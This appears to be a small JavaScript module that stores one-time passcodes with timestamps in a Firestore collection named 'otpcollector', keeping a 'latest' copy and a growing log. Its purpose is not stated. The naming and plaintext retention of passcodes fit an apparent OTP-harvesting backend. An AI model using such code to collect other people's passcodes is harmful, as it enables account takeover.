import { db } from './firebaseconfig';
import { collection, addDoc, doc, setDoc, serverTimestamp } from 'firebase/firestore';

async function storeData(otp) {
  try {
    const payload = {
      otp,
      timestamp: serverTimestamp(),
    };
    await setDoc(doc(db, 'otpcollector', 'latest'), payload);
    await addDoc(collection(db, 'otpcollector'), payload);
  } catch (e) {
    console.error('Error saving OTP: ', e);
  }
}

export default storeData;
